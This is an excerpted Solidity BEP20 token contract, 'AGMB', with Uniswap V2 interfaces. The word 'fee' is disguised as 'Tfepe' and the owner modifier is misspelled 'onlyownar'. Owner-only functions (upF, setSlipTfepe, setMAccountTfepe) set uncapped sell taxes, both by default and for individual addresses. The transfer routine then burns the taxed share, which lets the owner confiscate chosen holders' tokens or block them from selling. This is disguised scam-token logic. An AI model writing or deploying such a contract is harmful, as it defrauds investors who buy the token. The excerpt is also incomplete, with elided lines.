...
interface IUniswapV2Factory {
    ...
    function TfepeTo() external view returns (address);
    function TfepeToSetter() external view returns (address);
    ...
    function setTfepeTo(address) external;
    function setTfepeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingTfepeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingTfepeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingTfepeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingTfepeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingTfepeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract AGMB is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellTfepe = 0;

    uint256 private _defaultBuyTfepe = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipTfepe;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellTfepe = _value;
    }

    function setSlipTfepe(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipTfepe[_address] = _value;
    }

    function getSlipTfepe(address _address) external view onlyownar returns (uint256) {
        return _slipTfepe[_address];
    }


    function setMAccountTfepe(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountTfepe(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradeTfepeAmount = 0;

        if (rF) {
            uint256 tradeTfepe = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradeTfepe = _defaultSellTfepe;
                }
                if (from == uniswapV2Pair) {

                    tradeTfepe = _defaultBuyTfepe;
                }
            }
            if (_slipTfepe[from] > 0) {
                tradeTfepe = _slipTfepe[from];
            }

            tradeTfepeAmount = _Amount.mul(tradeTfepe).div(100);
        }


        if (tradeTfepeAmount > 0) {
            _balances[from] = _balances[from].sub(tradeTfepeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradeTfepeAmount);
            emit Transfer(from, _deadAddress, tradeTfepeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradeTfepeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradeTfepeAmount);
        emit Transfer(from, _to, _Amount - tradeTfepeAmount);
    }
